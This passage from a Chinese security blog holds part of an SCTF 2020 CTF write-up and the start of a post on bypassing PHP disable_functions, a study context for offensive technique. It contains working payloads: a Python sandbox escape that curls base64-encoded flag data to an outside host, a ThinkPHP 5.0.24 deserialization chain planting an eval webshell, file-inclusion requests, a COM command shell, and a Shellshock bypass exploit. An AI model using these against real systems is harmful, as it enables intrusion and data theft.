        if($_SERVER[&quot;REMOTE_ADDR&quot;] !== &quot;127.0.0.1&quot; &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;192.168.&quot;) !== 0 &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;10.&quot;) !== 0 )  {
            die(&quot;admin only&quot;);
        }
        if(!file_exists(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]))){
            mkdir(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]));
        }
    }
    public function rm(){
        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
        if(file_exists(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
            if(is_dir(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
                rmdir(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
                echo &quot;rmdir&quot;;
            }
            else{
                unlink(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
                echo &quot;unlink&quot;;
            }
        }
    }
    public function upload()
    {

        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
        file_put_contents(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;],base64_decode($_POST[&quot;content&quot;]));
        echo &quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;];
    }

    public function moveLog($filename)
    {

        $data =date(&quot;Y-m-d&quot;);
        if(!file_exists(storage_path(&quot;logs&quot;).&quot;/&quot;.$data)){
            mkdir(storage_path(&quot;logs&quot;).&quot;/&quot;.$data);
        }
        $opts = array(
            &#39;http&#39;=&gt;array(
                &#39;method&#39;=&gt;&quot;GET&quot;,
                &#39;timeout&#39;=&gt;1,//单位秒
            )
        );

        $content = file_get_contents(&quot;http://127.0.0.1/tmp/&quot;.md5(&#39;127.0.0.1&#39;).&quot;/&quot;.$filename,false,stream_context_create($opts));
        file_put_contents(storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename,$content);
        echo storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename;
    }
}</code></pre>
<p>storage_path(“logs”):/var/www/html/storage/logs</p>
<p>upload dir : /var/tmp/md5(IP)/</p>
<pre><code class="php=">Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
    readfile(&quot;./var/tmp/&quot;.$filename);
})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre>
<p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p>
<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
<pre><code class="python=">from flask import Flask, request

app = Flask(__name__)


@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])
def security():
    secret = request.form[&quot;cmd&quot;]
    for i in secret:
        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;

    exec(secret)
    return &quot;xXXxXXx&quot;


if __name__ == &#39;__main__&#39;:
    app.run(host=&quot;0.0.0.0&quot;)
</code></pre>
<p>测试环境：<a href="http://ccreater.top:60011/" target="_blank" rel="noopener">http://ccreater.top:60011/</a><br>禁用字符：</p>
<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
<p>利用魔术方法? : <code>__getitem__,__getattr__</code></p>
<p>payload:</p>
<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#39;) HTTP/1.1
Host: 39.104.90.30:10006
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://39.104.90.30:10006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
Content-Length: 248

------WebKitFormBoundaryx3B8HB5b
Content-Disposition: form-data; name=&quot;cmd&quot;

request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1
Host: 39.104.90.30:10006
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://39.104.90.30:10006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
Content-Length: 248

------WebKitFormBoundaryx3B8HB5b
Content-Disposition: form-data; name=&quot;cmd&quot;

request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
------WebKitFormBoundaryx3B8HB5b--
</code></pre><h3 id="为何payload能运行"><a href="#为何payload能运行" class="headerlink" title="为何payload能运行"></a>为何payload能运行</h3><p>我们都知道python 调用类方法的时候会传入<code>self</code>参数，而我们调用<code>app.config==request.args.a</code>应该也会传入self参数，那么为什么这个payload可以成功</p>
<p>测试代码</p>
<pre><code class="python">class A():
    pass
a = A()
a.__class__.__eq__=eval
a==&quot;print(123)&quot;
</code></pre>
<p>我们跟进python底层看看</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
<p>这里显示nargs显示只有1个参数，参看堆栈，跟踪到最开始的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
<p>这里我们确实传入了self,其中v是<code>self</code>,w是<code>print(123)</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
<p>在<code>call_unbound</code>处我们发现了原因，是因为ubound==0</p>
<p>在<code>lookup_maybe_method</code>中设置了ubound的值</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
<blockquote>
<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
</blockquote>
<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
<pre><code>http://39.99.41.124/public/log.txt
http://39.99.41.124/public/test/
http://39.99.41.124/public/nationalsb/login.php

</code></pre><p>在<a href="http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：" target="_blank" rel="noopener">http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：</a></p>
<pre><code>    //username:Admin1964752
    //password:DsaPPPP!@#amspe1221
    //Secret **** is your birthday</code></pre><p>文件包含:</p>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 39.99.41.124
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

file=/etc/passwd</code></pre><pre><code>
Warning&lt;/b&gt;:  include(): Failed opening &#39;php://filter/read=convert.base64-encode/resource=index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</code></pre><pre><code>GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Host: 39.99.41.124
Connection: close
</code></pre><pre><code class="php=">&lt;?php
namespace app\index\controller;

class Index extends \think\Controller{
  public function index(){
      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;
    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;
    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;  
  }
  public function hello(){
      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
  }
}
</code></pre>
<p>/var/www/html/protect.py</p>
<pre><code class="python=">....</code></pre>
<pre><code class="php=">&lt;?php
namespace think\cache\driver;

class File {
    protected $options = [];
    protected $tag;
    public function __construct() {
    $this-&gt;tag = &#39;cjbtest&#39;;
    $this-&gt;options = [
        &#39;cache_subdir&#39;  =&gt; false,
        &#39;prefix&#39;        =&gt; &#39;&#39;,
        &#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#39;, // 因为 static 目录有写权限
        &#39;data_compress&#39; =&gt; false
    ];
    }
}

namespace think\session\driver;
use think\cache\driver\File;

class Memcached {
    protected $handler;
    function __construct() {
    $this-&gt;handler=new File();
    }
}

namespace think\console;
use think\session\driver\Memcached;

class Output {
    protected $styles = [];
    private $handle;
    function __construct() {
    $this-&gt;styles = [&quot;getAttr&quot;, &#39;info&#39;,
             &#39;error&#39;,
             &#39;comment&#39;,
             &#39;question&#39;,
             &#39;highlight&#39;,
             &#39;warning&#39;];
    $this-&gt;handle = new Memcached();
    }
}

namespace think\db;
use think\console\Output;

class Query {
    protected $model;
    function __construct() {
    $this-&gt;model = new Output();
    }
}

namespace think\model\relation;
use think\console\Output;
use think\db\Query;

class HasOne {
    public $model;
    protected $selfRelation;
    protected $parent;
    protected $query;
    protected $bindAttr = [];
    public function __construct() {
    $this-&gt;query = new Query(&quot;xx&quot;, &#39;think\console\Output&#39;);
    $this-&gt;model = false;
    $this-&gt;selfRelation = false;
    $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];
    }}

namespace think\model;
use think\console\Output;
use think\model\relation\HasOne;

abstract class Model {
}

class Pivot extends Model {
    public $parent;
    protected $append = [];
    protected $data = [];
    protected $error;
    protected $model;

    function __construct() {
    $this-&gt;parent = new Output();
    $this-&gt;error = new HasOne();
    $this-&gt;model = &quot;test&quot;;
    $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];
    $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];
    }
}

namespace think\process\pipes;
use think\model\Pivot;

class Windows {
    private $files = [];
    public function __construct() {
    $this-&gt;files=[new Pivot()];
    }
}

$obj = new Windows();
$payload = serialize($obj);
echo base64_encode($payload);</code></pre>
<p>写文件到/tmp</p>
<pre><code class="python=">import requests
import hashlib
payload=requests.get(&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;).text.strip()
burp0_url = &quot;http://8.208.102.48:80/public/index.php&quot;
params={
    &quot;s&quot;:&quot;/index/Index/hello&quot;,
    &quot;s3cr3tk3y&quot;:payload
}
burp0_headers = {&quot;Authorization&quot;: &quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;, &quot;Connection&quot;: &quot;close&quot;}
res=requests.get(burp0_url, headers=burp0_headers ,params=params)
print(res.text)
print(requests.get(&quot;http://8.208.102.48:80/public/log.txt&quot;).text)
</code></pre>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 8.208.102.48
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 155

file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</code></pre><p>写到文件里的内容</p>
<pre><code>&lt;?php
//000000000000
 exit();?&gt;
s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</code></pre><p>这里 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> 里面的方法已经不管用了，我们需要自己想出其他办法</p>
<p>这里我们用<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>来绕过死亡exit</p>
<pre><code class="php">    $backdoor = &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
    $x = str_rot13(base64_encode($payload));
    $payload = base64_decode(str_rot13(base64_encode($backdoor)));
    assert(base64_decode($x) === $backdoor);</code></pre>
<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
<p>最后的payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 8.208.102.48
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#39;cat /flag&#39;);</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/07/sctf2020/">http://blog.ccreater.top/2020/07/07/sctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/07/sctf2020/" data-id="ckcblsj910000fwv08vp22raj" data-title="sctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/30/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="2020-06-30T05:23:19.204Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/30/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="危险函数-类"><a href="#危险函数-类" class="headerlink" title="危险函数/类"></a>危险函数/类</h2><pre><code>FFI
COM
exec
assert
eval
system
ini_set/ini_alter
putenv
imap_open
pcntl_exec
win_shell_execute
dl</code></pre><h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>利用条件：</p>
<pre><code>extension=php_com_dotnet.dll
com.allow_dcom = true
wshom.ocx 存在</code></pre><pre><code class="php">$command = $_GET[&#39;cmd&#39;];
$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能
$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;</code></pre>
<h2 id="GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271"><a href="#GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271" class="headerlink" title="GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271"></a>GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271</h2><blockquote>
<p>   被攻击的bash存在漏洞（版本小于等于4.3）<br>   攻击者可以控制环境变量<br>   新的bash进程被打开触发漏洞并执行命令</p>
</blockquote>
<p>利用php的mail函数:<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>4.3及之前的bash启动解析环境变量时未对边界进行严格的限制</p>
<p>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
<p>bash函数的格式,调用函数只需变量名+参数即可<code>函数 参数1 参数2</code></p>
<pre><code class="bash">funtion ShellShock 
{ echo &quot;Injection&quot;} ShellShock   #调用这个函数</code></pre>
<p>这个时候的Bash的环境变量：</p>
<pre><code>KEY = ShellShockVALUE = () { echo Injection; }

</code></pre><p>来看看ShellShock漏洞的真身：</p>
<pre><code class="shell">export ShellShock=&#39;() { :; }; echo;/usr/bin/whoami&#39;
bash&gt;Kr0iN</code></pre>
<p>看看环境变量你有什么<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<pre><code class="bash">env x=&#39;() { :;}; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre>
<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="php的mail函数"><a href="#php的mail函数" class="headerlink" title="php的mail函数()"></a>php的mail函数()</h4><p>如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行</p>
<p>会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p>
<p>更详细的解释:p牛的<a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p>
<pre><code class="php"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
&lt;pre&gt;
&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&#39;disable_functions&#39;).&quot;\n&quot;; ?&gt;
&lt;?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {
     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);
     putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#39;t actually send any mail
   }
   else return &quot;Not vuln (not bash)&quot;;
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != &quot;&quot;) return $output;
   else return &quot;No output, or not vuln.&quot;;
}
echo shellshock($_REQUEST[&quot;cmd&quot;]);
?&gt;</code></pre>
<h2 id="利用php-fpm未授权访问漏洞"><a href="#利用php-fpm未授权访问漏洞" class="headerlink" title="利用php-fpm未授权访问漏洞"></a>利用php-fpm未授权访问漏洞</h2><h3 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">浅析php-fpm的攻击方式</a></p>
<h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<p>说到fastcgi,就必须先讲一下cgi</p>
<p>cgi的历史:</p>
<blockquote>
<p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
</blockquote>
<p>Fast-CGI:</p>
<p>虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。</p>
<blockquote>
<p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
<p>php-fpm 是一个Fastcgi的实现,并提供进程管理功能。</p>
<p>进程包含了master进程和worker进程</p>
<p>master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>上面第一个是主进程,下面两个是worker进程。</p>
<h3 id="服务器利用fastcgi的通信过程"><a href="#服务器利用fastcgi的通信过程" class="headerlink" title="服务器利用fastcgi的通信过程"></a>服务器利用fastcgi的通信过程</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>record具有固定的结构。</p>
<pre><code class="c">typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;</code></pre>
<p>而其中的<code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
<p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
<p>借用<a href="http://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
<p>我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。</p>
<p>php里有很多有趣的设置,像文件包含里常用的php设置<code>auto_prepared_file,auto_append_file</code></p>
<p>我们令<code>auto_prepared_file=php://input</code>且<code>allow_url_include=On</code></p>
<p>那么我们该如何利用fastcgi来设置php的环境变量</p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>结构体实例:</p>
<pre><code class="php">array(
        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
        &#39;REQUEST_METHOD&#39; =&gt; &#39;POST&#39;,
        &#39;SCRIPT_FILENAME&#39; =&gt; &#39;/var/www/html/index.php&#39;,
        &#39;SERVER_SOFTWARE&#39; =&gt; &#39;php/fcgiclient&#39;,
        &#39;REMOTE_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;REMOTE_PORT&#39; =&gt; &#39;9985&#39;,
